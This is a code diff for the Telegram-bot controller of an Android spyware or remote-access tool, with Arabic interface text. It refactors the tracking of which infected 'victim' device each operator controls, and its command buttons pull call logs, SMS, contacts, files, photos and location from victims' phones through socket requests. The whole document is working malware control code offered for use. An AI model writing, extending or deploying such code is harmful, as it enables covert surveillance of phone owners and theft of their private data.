@@ -12,9 +12,10 @@ const uploader = multer();
 
 const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 const bot = new telegramBot(data['token'], { 'polling': true });
-const appData = new Map();
 
-// قائمة الأوامر الكاملة للتحكم التام
+// استخدام خريطة تربط كل مدير (ChatId) بالضحية الذي يتحكم به حالياً
+const activeTargets = new Map();
+
 const fullCommands = [
     ['📞 سجل المكالمات 📞', '💬 سحب الرسائل 💬'],
     ['📒 سحبجهات الاتصال 📒', '📂 عرض جميع الملفات 📂'],
@@ -65,7 +66,7 @@ bot.on('message', msg => {
     let text = msg.text;
 
     if (text === '/start') {
-        appData.delete('currentTar');
+        activeTargets.delete(chatId);
         bot.sendMessage(chatId, `<b>✯ أهلاً بك في لوحة تحكم الضحايا </b>\n\n• البوت جاهز للسيطرة التامة...\n\n`, {
             parse_mode: 'HTML',
             reply_markup: {
@@ -107,7 +108,7 @@ bot.on('message', msg => {
             });
         }
     } else if (text === '✯ العودة إلى القائمة الرئيسية ✯') {
-        appData.delete('currentTar');
+        activeTargets.delete(chatId);
         bot.sendMessage(chatId, '<b>✯ القائمة الرئيسية </b>', {
             parse_mode: 'HTML',
             reply_markup: {
@@ -118,19 +119,20 @@ bot.on('message', msg => {
             }
         });
     } else {
-        // التحقق إذا كان المستخدم ضغط على اسم جهاز معين لتعيينه هدفاً للتحكم
-        let selectedSocketId = null;
-        let selectedModelName = null;
+        // التحقق هل النص المطابق هو اسم جهاز متصل
+        let matchedSocketId = null;
+        let matchedModel = null;
         io.sockets.sockets.forEach((socketObj, socketId) => {
             if (socketObj.model === text) {
-                selectedSocketId = socketId;
-                selectedModelName = socketObj.model;
+                matchedSocketId = socketId;
+                matchedModel = socketObj.model;
             }
         });
 
-        if (selectedSocketId) {
-            appData.set('currentTar', selectedSocketId);
-            bot.sendMessage(chatId, `<b>✯ تم بنجاح اختيار الجهاز: </b>${selectedModelName}\n\n• اختر الأمر المطلوب تنفيذه من الأزرار أدناه:`, {
+        if (matchedSocketId) {
+            // حفظ الجهاز المرتبط بهذا المشرف
+            activeTargets.set(chatId, matchedSocketId);
+            bot.sendMessage(chatId, `<b>✯ تم اختيار الجهاز بنجاح: </b>${matchedModel}\n\n• اختر الأمر المطلوب تنفيذه:`, {
                 parse_mode: 'HTML',
                 reply_markup: {
                     keyboard: fullCommands,
@@ -138,9 +140,9 @@ bot.on('message', msg => {
                 }
             });
         } else {
-            // تنفيذ الأوامر المختارة وإرسالها للضحية المستهدف
-            let targetUuid = appData.get('currentTar');
-            if (targetUuid) {
+            // تنفيذ الأوامر على الجهاز المحفوظ مسبقاً
+            let targetSocketId = activeTargets.get(chatId);
+            if (targetSocketId) {
                 let actionCode = text;
                 if (text.includes('سجل المكالمات')) actionCode = 'calls';
                 else if (text.includes('سحب الرسائل')) actionCode = 'sms';
@@ -153,13 +155,13 @@ bot.on('message', msg => {
                 else if (text.includes('جميع الصور')) actionCode = 'photos';
                 else if (text.includes('الموقع الجغرافي')) actionCode = 'location';
 
-                io.to(targetUuid).emit('request', {
+                io.to(targetSocketId).emit('request', {
                     request: actionCode
                 });
 
                 bot.sendMessage(chatId, `<b>✯ جاري تنفيذ الأمر (${text}) على الجهاز...</b>`, { parse_mode: 'HTML' });
             } else {
-                bot.sendMessage(chatId, '<b>⚠️ يرجى اختيار جهاز من قائمة التحكم أولاً!</b>', { parse_mode: 'HTML' });
+                bot.sendMessage(chatId, '<b>⚠️ يرجى الانتقال إلى "قائمة التحكم" واختيار الجهاز أولاً!</b>', { parse_mode: 'HTML' });
             }
         }
     }
